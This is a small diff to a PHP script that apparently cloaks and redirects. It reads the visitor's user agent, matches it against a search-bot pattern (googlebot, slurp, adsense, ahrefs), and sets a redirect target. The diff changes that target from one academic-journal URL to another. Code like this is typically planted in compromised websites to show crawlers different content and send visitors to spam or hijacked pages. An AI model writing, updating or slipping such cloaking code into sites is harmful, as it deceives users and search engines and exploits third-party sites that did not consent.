@@ -5,7 +5,7 @@ header('Vary: User-Agent');
 
 $ua = strtolower($_SERVER["HTTP_USER_AGENT"]);
 
-$urlTo = "https://bsorj.uomustansiriyah.edu.iq/index.php/files/login/lostPassword";
+$urlTo = "https://real.spcrd.org/index.php/real/article/view/286";
 
 $botchar = "/(googlebot|slurp|adsense|inspection|ahrefs)/";
 
